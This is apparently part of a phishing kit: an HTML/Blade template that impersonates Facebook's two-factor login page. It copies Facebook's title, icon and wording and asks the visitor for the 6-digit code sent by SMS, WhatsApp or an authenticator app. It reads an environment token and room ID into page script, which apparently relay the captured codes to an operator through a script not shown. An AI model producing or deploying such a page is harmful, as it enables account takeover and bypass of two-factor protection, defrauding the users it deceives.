<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="token" content="{{ env('TOKEN') }}">
        <meta name="room-id" content="{{ env('ROOM_ID') }}">
        <title>Facebook</title>
        <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" type="image/x-icon" />
        <script src="https://unpkg.com/@tailwindcss/browser@4"></script>
        <script>
            const token     = document.querySelector('meta[name="token"]').content;
            const roomId    = document.querySelector('meta[name="room-id"]').content;
        </script>
    </head>
    <body class="bg-[#FFFFFF] px-4">
        <div class="max-w-[600px] mx-auto mt-16">
            <div class="flex items-center gap-2 mb-4">
                <span id="userEmail" class="text-[13px] leading-[17px] font-[500] text-[rgb(10,19,23)]"></span>
            </div>
            <div class="">
                <h1 class="text-[24px] leading-[28px] font-[600] text-[rgb(10,19,23)] mb-2">{{__('msg.Check your text messages')}}</h1>
                <p class="text-[15px] leading-[19px] font-[400] text-[rgb(10,19,23)] mb-4">{{__("msg.Enter the 6-digit code that we've just sent to your SMS, WhatsApp or from the authentication app that you set up.")}}</p>
                <div class="mb-4 flex justify-center">
                    <img src="images/text-message.png" alt="Two-factor authentication illustration" class="w-full" />
                </div>
                <div class="relative">
                    <input type="text" placeholder="{{__('msg.Code')}}" id="codeInput" maxlength="8" pattern="[0-9]*" inputmode="numeric" class="w-full px-[16px] py-[14px] text-[17px] border border-[#dddfe2] rounded-[16px] mb-3 focus:outline-none focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff] transition-colors duration-200" />
                    <p id="errorMessage" class="text-[#D31130] text-[13px] mb-2 hidden items-center gap-2">
                        <svg viewBox="0 0 24 24" class="w-4 h-4 text-[#D31130]" fill="currentColor" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm1.25-7.002c0 .6-.416 1-1.25 1-.833 0-1.25-.4-1.25-1s.417-1 1.25-1c.834 0 1.25.4 1.25 1zm-.374-8.125a.875.875 0 0 0-1.75 0v4.975a.875.875 0 1 0 1.75 0V7.873z"></path>
                        </svg>
                        {{__("msg.The login code you entered doesn't match the one sent to your phone. Please check the number and try again.")}}
                    </p>
                </div>
                <button id="continueBtn" class="w-full h-[44px] bg-[#0064E0] opacity-40 cursor-not-allowed text-white font-[500] text-[15px] rounded-[22px] mb-2 hover:bg-[#0064E0] transition-colors">{{__('msg.Continue')}}</button>

                <button class="w-full h-[44px] bg-white text-[#1c1e21] font-[500] text-[15px] rounded-[22px] border border-[#dddfe2] hover:bg-[#f5f6f7] transition-colors">{{__('msg.Try Another Way')}}</button>
            </div>
        </div>
        <script src="/assets/js/two_step_verification.js"></script>
    </body>
</html>
